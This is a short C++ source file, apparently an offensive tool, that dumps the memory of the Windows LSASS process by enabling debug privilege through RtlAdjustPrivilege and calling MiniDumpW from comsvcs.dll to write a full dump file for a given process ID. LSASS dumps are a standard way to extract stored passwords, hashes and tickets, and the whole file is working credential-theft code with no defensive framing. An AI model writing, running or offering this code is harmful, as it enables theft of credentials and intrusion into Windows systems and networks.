// minidump.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <Windows.h>

typedef HRESULT(WINAPI* _MiniDumpW)(
	DWORD arg1, DWORD arg2, PWCHAR cmdline);


typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
	ULONG Privilege, BOOL Enable,
	BOOL CurrentThread, PULONG Enabled);

int main(int argc, char *argv[])
{
	if (argc != 2) {
		printf("minidump.exe <pid>");
		exit(1);
	}
	ULONG  t;
	_RtlAdjustPrivilege RtlAdjustPrivilege;
	_MiniDumpW          MiniDumpW;
	wchar_t format_cmdline[] = L"%d lsass.exe.dump full";
	wchar_t cmdline[999];
	swprintf(cmdline, sizeof(format_cmdline), format_cmdline, atoi(argv[1]));
	MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
	RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");
	RtlAdjustPrivilege(20, TRUE, FALSE, &t);
	MiniDumpW(0, 0, cmdline);
	printf("dump sucess\n");
    return 0;
}

